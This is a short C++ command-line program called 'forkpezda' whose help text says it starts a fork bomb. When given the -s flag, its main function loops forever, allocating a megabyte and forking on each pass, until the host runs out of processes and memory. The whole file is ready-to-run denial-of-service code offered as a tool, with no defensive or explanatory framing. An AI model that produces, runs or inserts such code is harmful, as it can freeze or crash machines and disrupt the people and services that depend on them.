#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <vector>
#include <string>
#include <unistd.h>
#include <algorithm>

class InputParser {
    public:
        InputParser(int& argc, char** argv) {
            for (int i = 1; i < argc; ++i)
                this->tokens.push_back(std::string(argv[i]));
        }
        /// @author iain
        const std::string& getCmdOption(const std::string& option) const {
            std::vector<std::string>::const_iterator itr;
            itr = std::find(this->tokens.begin(), this->tokens.end(), option);
            if (itr != this->tokens.end() && ++itr != this->tokens.end()) {
                return *itr;
            }
            static const std::string empty_string("");
            return empty_string;
        }
        /// @author iain
        bool cmdOptionExists(const std::string& option) const {
            return std::find(this->tokens.begin(), this->tokens.end(), option)
                != this->tokens.end();
        }
    private:
        std::vector <std::string> tokens;
};

int main(int argc, char** argv) {
    InputParser input(argc, argv);
    if (input.cmdOptionExists("-h")) {
        fprintf(stderr, "usage: forkpezda [-s]\n" \
            "Options:\n" \
            "\t-s\tStart fork bomb\n" \
            "\t-h\tShow this message\n");
        return 0;
    }
    if (input.cmdOptionExists("-s")) {
        while (1) {
            malloc(1000000);
            fork();
        }
    }
    else {
        std::cout << "error: no command";
        return 0;
    }
    return 0;
}
